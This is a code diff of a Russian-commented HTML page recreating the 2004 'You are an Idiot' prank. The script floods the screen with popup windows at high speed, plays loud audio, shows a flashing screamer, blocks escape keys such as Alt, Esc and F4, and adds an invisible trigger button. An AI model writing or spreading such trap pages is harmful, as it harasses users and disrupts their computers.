@@ -10,11 +10,11 @@
     height: 100%;
     overflow: hidden;
     font-family: Arial, sans-serif;
-    background: #111;
+    background: #000;
     color: #fff;
   }
 
-  /* ===== Экран с кнопкой ===== */
+  /* ===== Стартовый экран ===== */
   #start-screen {
     width: 100%;
     height: 100%;
@@ -23,50 +23,64 @@
     align-items: center;
     justify-content: center;
     text-align: center;
-    background: #000;
+    background: #111;
+    z-index: 100;
   }
 
   #start-screen h1 {
-    font-size: 42px;
-    margin-bottom: 20px;
-    color: #fff;
+    font-size: 48px;
+    margin-bottom: 15px;
   }
 
   #start-screen p {
-    font-size: 18px;
-    color: #aaa;
-    margin-bottom: 40px;
-    max-width: 500px;
+    font-size: 17px;
+    color: #999;
+    margin-bottom: 45px;
+    max-width: 420px;
     line-height: 1.5;
   }
 
   #continue-btn {
-    padding: 18px 55px;
-    font-size: 22px;
+    padding: 16px 50px;
+    font-size: 20px;
     font-weight: bold;
     background: #fff;
     color: #000;
     border: none;
-    border-radius: 8px;
+    border-radius: 6px;
     cursor: pointer;
     transition: 0.15s;
   }
 
   #continue-btn:hover {
     background: #ff0;
-    transform: scale(1.05);
+    transform: scale(1.07);
   }
 
-  /* ===== Сам вирус ===== */
-  #virus {
+  /* Невидимая 1x1 кнопка */
+  #tiny-btn {
+    position: absolute;
+    width: 1px;
+    height: 1px;
+    opacity: 0;
+    pointer-events: auto;
+    top: 0;
+    left: 0;
+    z-index: 9999;
+  }
+
+  /* ===== Скример ===== */
+  #screamer {
     display: none;
-    width: 100%;
-    height: 100%;
+    position: fixed;
+    inset: 0;
+    background: #000;
+    z-index: 99999;
     flex-direction: column;
     align-items: center;
     justify-content: center;
     text-align: center;
-    animation: flash 0.35s infinite step-end;
+    animation: flash 0.18s infinite step-end;
   }
 
   @keyframes flash {
@@ -74,23 +88,24 @@
     50%  { background: #fff; color: #000; }
   }
 
-  #virus h1 {
-    font-family: "Times New Roman", serif;
-    font-size: 6.5vw;
+  #screamer h1 {
+    font-family: "Times New Roman", Times, serif;
+    font-size: 9vw;
     font-weight: normal;
-    margin-bottom: 45px;
+    margin-bottom: 40px;
+    letter-spacing: 3px;
   }
 
   .faces {
     display: flex;
-    gap: 50px;
-    font-size: 8vw;
+    gap: 60px;
+    font-size: 11vw;
   }
 
   .face {
-    width: 1.15em;
-    height: 1.15em;
-    border: 0.08em solid currentColor;
+    width: 1.2em;
+    height: 1.2em;
+    border: 0.09em solid currentColor;
     border-radius: 50%;
     position: relative;
   }
@@ -98,24 +113,24 @@
   .face::before, .face::after {
     content: "";
     position: absolute;
-    width: 0.22em;
-    height: 0.22em;
+    width: 0.25em;
+    height: 0.25em;
     background: currentColor;
     border-radius: 50%;
-    top: 0.28em;
+    top: 0.3em;
   }
 
-  .face::before { left: 0.25em; }
-  .face::after  { right: 0.25em; }
+  .face::before { left: 0.28em; }
+  .face::after  { right: 0.28em; }
 
   .face span {
     position: absolute;
-    bottom: 0.22em;
+    bottom: 0.25em;
     left: 50%;
     transform: translateX(-50%);
-    width: 0.5em;
-    height: 0.25em;
-    border-bottom: 0.08em solid currentColor;
+    width: 0.55em;
+    height: 0.28em;
+    border-bottom: 0.09em solid currentColor;
     border-radius: 0 0 50% 50%;
   }
 </style>
@@ -125,16 +140,16 @@
 <!-- Стартовый экран -->
 <div id="start-screen">
   <h1>You are an Idiot!</h1>
-  <p>
-    Это воссоздание легендарного прикола 2004 года.<br>
-    После нажатия кнопки начнётся спам окон + звук.
-  </p>
+  <p>Классический прикол 2004 года.<br>Нажми Continue, чтобы продолжить.</p>
   <button id="continue-btn">Continue</button>
 </div>
 
-<!-- Сам вирус (скрыт) -->
-<div id="virus">
-  <h1>you are an idiot</h1>
+<!-- Невидимая 1×1 кнопка -->
+<button id="tiny-btn"></button>
+
+<!-- Скример -->
+<div id="screamer">
+  <h1>YOU ARE AN IDIOT</h1>
   <div class="faces">
     <div class="face"><span></span></div>
     <div class="face"><span></span></div>
@@ -148,36 +163,23 @@
 
 <script>
   const startScreen = document.getElementById("start-screen");
-  const virus = document.getElementById("virus");
+  const screamer = document.getElementById("screamer");
   const audio = document.getElementById("audio");
-  const btn = document.getElementById("continue-btn");
+  const continueBtn = document.getElementById("continue-btn");
+  const tinyBtn = document.getElementById("tiny-btn");
 
-  // === Bounce ===
-  let xOff = 7, yOff = 5, xPos = 200, yPos = 150;
+  let started = false;
 
-  function bounce() {
-    xPos += xOff;
-    yPos += yOff;
-
-    if (xPos > screen.availWidth - 320)  xOff = -(Math.abs(xOff) + Math.random() * 4);
-    if (xPos < 0)                       xOff =  Math.abs(xOff) + Math.random() * 4;
-    if (yPos > screen.availHeight - 240) yOff = -(Math.abs(yOff) + Math.random() * 4);
-    if (yPos < 0)                       yOff =  Math.abs(yOff) + Math.random() * 4;
-
-    try { window.moveTo(Math.floor(xPos), Math.floor(yPos)); } catch(e) {}
-    requestAnimationFrame(bounce);
-  }
-
-  // === Спавн окон ===
-  function spawn(count = 5) {
+  // ===== Спавн окон =====
+  function spawn(count = 4) {
     for (let i = 0; i < count; i++) {
-      const left = Math.floor(Math.random() * (screen.availWidth - 300));
-      const top  = Math.floor(Math.random() * (screen.availHeight - 220));
+      const left = Math.floor(Math.random() * (screen.availWidth - 320));
+      const top  = Math.floor(Math.random() * (screen.availHeight - 240));
 
       const w = window.open(
         location.href,
         "_blank",
-        `width=300,height=220,left=\( {left},top= \){top},menubar=no,toolbar=no,location=no,status=no,resizable=no`
+        `width=280,height=200,left=\( {left},top= \){top},menubar=no,toolbar=no,location=no,status=no,resizable=no`
       );
       if (w) {
         try { w.focus(); } catch(e) {}
@@ -185,44 +187,63 @@
     }
   }
 
-  // === Запуск вируса ===
-  function startVirus() {
-    startScreen.style.display = "none";
-    virus.style.display = "flex";
+  // ===== Невидимая кнопка 1×1 — быстро нажимается =====
+  function rapidClick() {
+    if (!started) return;
 
+    // имитируем очень быстрые нажатия
+    tinyBtn.click();
+    spawn(2);
+  }
+
+  // ===== Запуск после Continue =====
+  function startPrank() {
+    if (started) return;
+    started = true;
+
+    startScreen.style.display = "none";
+    screamer.style.display = "flex";
+
+    // звук на полную
     audio.volume = 1;
     audio.play().catch(() => {});
 
-    bounce();
-    spawn(6); // сразу пачка окон
+    // сразу пачка окон
+    spawn(8);
 
-    // дальше спамим
-    setInterval(() => spawn(3), 1800);
+    // очень быстрый спам через невидимую кнопку
+    setInterval(rapidClick, 90);          // каждые 90 мс
+    setInterval(() => spawn(3), 700);     // дополнительный спам
 
     // при попытке закрыть
     window.onbeforeunload = () => {
-      spawn(8);
+      spawn(10);
       return "You are an idiot!";
     };
 
     // клик и движение мыши тоже спавнят
-    document.body.onclick = () => spawn(4);
+    document.body.onclick = () => spawn(5);
     document.body.onmousemove = () => {
-      if (Math.random() > 0.92) spawn(2);
+      if (Math.random() > 0.85) spawn(2);
     };
 
     // блокировка клавиш
     document.onkeydown = (e) => {
       if ([17, 18, 27, 46, 115].includes(e.keyCode)) {
         e.preventDefault();
-        alert("You are an idiot!");
-        spawn(5);
+        alert("YOU ARE AN IDIOT");
+        spawn(6);
       }
     };
   }
 
   // Кнопка Continue
-  btn.addEventListener("click", startVirus);
+  continueBtn.addEventListener("click", startPrank);
+
+  // Невидимая кнопка тоже может запускать (на всякий случай)
+  tinyBtn.addEventListener("click", () => {
+    if (!started) startPrank();
+  });
 </script>
 </body>
-  </html>
+</html>
